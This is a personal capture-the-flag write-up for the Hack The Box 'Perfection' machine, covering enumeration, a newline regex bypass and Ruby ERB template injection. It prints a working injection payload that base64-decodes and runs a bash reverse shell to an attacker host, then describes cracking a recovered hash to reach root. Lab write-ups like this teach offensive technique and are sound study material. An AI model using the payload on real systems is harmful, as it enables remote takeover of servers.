### Perfection Machine Write up 

I haven't made any machines in tryhackme or hackthebox for a long time, but now i'm starting with it again. Honestly i'll try to do more machines in hackthebox because tryhackme is getting a little boring, so let's go. On that machine i'm gonna try to use metasploit to organize the gathering information, let's see if it helps :). As i really don't know how to use it yet i'm gonna document everything down here to fix it in my memory. 

First of all, i need to download the postgresql to use the metasploit database and start the msfdb.

```bash
$ sudo pacman -S postgresql 
$ msfdb init
$ msfdb start
```

your output must be like this:

![](attachments/Pasted%20image%2020240303163502.png)

To check if everything is set up right, use db_status command after msfconsole. Before going straight to exploitation and crazy stuff we need to set up an workspace for us, the default workspace is "default" and you can check this using "workspace" command. I'm gonna create a new one to work in this room called akame_ws.

So now we can get started, start the machine in htb, connect to their vpn and add it in your hosts to make easier manipulate the address. 

Starting with a nmap scan to enumerate the machine below:

```bash
$ sudo nmap -Pn -sC -sV perfection.htb -oX perfection.xml | tee perfection_scan.log
```
-Pn - This flag disable the ping scan to see if the host or hosts are up and if they are, continue with the another scan such a port scan. This can be useful when you are enumerating a big network or more than one host, but in this case is useful so i disable it.

-sC - This flag is same that --script=default and it's related to the Nmap Script Engine(NSE), NSE is a feature from nmap that allow users to write and share scripts in Lua Language to useful network tasks and this scripts are executed in parallel your command runs and can be found at "/usr/share/nmap/scripts/". -sC means that nmap will use "defaults scripts" what means probably mean a bunch of scripts but it's useful(sometimes not stealth).

-sV - This flag is used to enumerate services and versions, when nmap finds a open port, he will tries to connect to get some information about what kinda of service it is and tries to guess the version. Again, is not the best choice if you are trying to be stealth again because it establish a connection from your machine to your target.

perfection.htb - Is the host name that you've added to your host file, it can be just the ip address too, doesn't change much.

-oX - I'm using this flag to generate a xml output to import using the msfconsole after the scan is done.

tee - The last one is a pipe and tee to send all output that is generate in terminal to perfection_scan.log file.

![](attachments/Pasted%20image%2020240303173233.png)

![](attachments/Pasted%20image%2020240303173606.png)
seeing the web page, looks like is a web site with a kinda of grade calculator with some inputs available at perfection.htb/weighted-grade

![](attachments/Pasted%20image%2020240303174616.png)

this inputs can be vulnerable to injections such as xss, but first i'm gonna analyze the all web site with developers tool and see what more we have.

![](attachments/Pasted%20image%2020240303175054.png)

it's a tip for users and looks like Susan is the admin, while i'm trying to explore this inputs i'm gonna let gobuster running to see if i can find any directory.

```bash
$ gobuster dir -u perfection.htb/ -w /usr/share/wordlist/directory.txt
```

So, while i was testing inputs i received this response here:

![](attachments/Pasted%20image%2020240303180627.png)

Maybe i can bypass this protection if it's client side, i'm gonna use burp to intercept the request and modify from there.

The protection was server side, i couldn't bypass it just avoiding javascript. I've spend a lot of time trying bypass this shit because every special characters were being blocked but only / and %. Because of the use of % is allowed i was thinking about html encode chars, but it doesn't help so much until i figure out that %0a was able to bypass the regex filter. After the "\n" or %0a, it doesn't filter and now i was able to insert whatever i want to. In this step i was thinking this as command injection directly in the machine but i was wrong. So after a lot tries i received a error message using this payload:

![](attachments/Pasted%20image%2020240304161652.png)

it's url encoded, normal must be look like this: mycategory%0a;<%= 7*7 %> 

but in that point i was thinking about how this shit works and doing some search looks like is a Server-Side-Template-Injection, i really underestimate this machine because the easy level but looks like here the things here are a little warmer. I didn't know this type of vulnerability so it's a good chance to learn.

This vulnerability appears when it's possible to use the native language syntax to inject malicious payloads, looking that way can be quite similar to sql injection, these payloads will run and being executed in somewhere, can be server-side or even loaded in user-side. Template are used for generate custom web pages, reusing static web pages elements while defining dynamic elements using parameters, like in this calculator. An template is getting my input and creating this result showing the grades to me. This [blog](https://medium.com/@olivia.j.01101001/how-to-use-php-templating-engines-for-web-development-6800c9048b9c) show good examples of template uses.

Using some portswigger examples:

`$output = $twig->render("Dear " . $_GET['name']);`

This is vulnerable to Server-Side-Template-Injection, but to exploit this you will need to use specific template syntax to escape from the render function and execute your own commands. There is a bunch templates that are being used thought the internet and to exploit one of these you need to identify the template engine and to achieve this you'll need to manually test different language-specif payloads and finding the right one in a process of elimination. 

In your case, according to the HackTricks website, the right one is called ERB and is the language is Ruby.

![](attachments/Pasted%20image%2020240304172815.png)

So now that we can execute commands, is simple to get a reverse shell, let's do it. 

![](attachments/Pasted%20image%2020240304182704.png)


```bash
category1=a///A77ss/e%0A;<%25%3d+system("echo IyEvYmluL2Jhc2gK
YmFzaCAgLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTIxLzIyMjIgMD4mMSIK | base64 -d | bash")+%25>+

```

It was the payload that i did use to get a reverse shell and get the user flag in home directory of Susan user.  The good notice was that Susan were part of sudo group, so the only think that i did need was figure out the susan password.

![](attachments/Pasted%20image%2020240304182857.png)

So doing some search between files and some output from linpeas.sh i found this email here:

![](attachments/Pasted%20image%2020240304192638.png)

Ok so all good so far, susan's password is something like "susan_nasus_??????????". But this wasn't to find the susan password because bruteforce 1 billion will take a long time, so i was thinking that might had something else and it did. I found a credentials.db inside the Migration folder in susan's home directory. This type of file can be used to "reconstruct" a database(this is what i understood) using tools like sqllitebrowser and that was i did.

![](attachments/Pasted%20image%2020240304185352.png)

![](attachments/Pasted%20image%2020240304185259.png)

And now we have some hashes and probably is more realistic try to use a tool to "brute-force" it. Was we already knew about a half of the password, i used some wildcards in hashcat to make the process a little quicker.

![](attachments/Pasted%20image%2020240304192601.png)

And there is:

![](attachments/Pasted%20image%2020240304193125.png)

now just spawn a bash terminal and got the root flag :)
![](attachments/Pasted%20image%2020240304193420.png)

A lot of fun doing this machine, i don't think the first part of this machine was easy because create a payload that properly works to get a shell was really pain in my ass exploiting this ssti vulnerability but the root flag was really easy tbh.

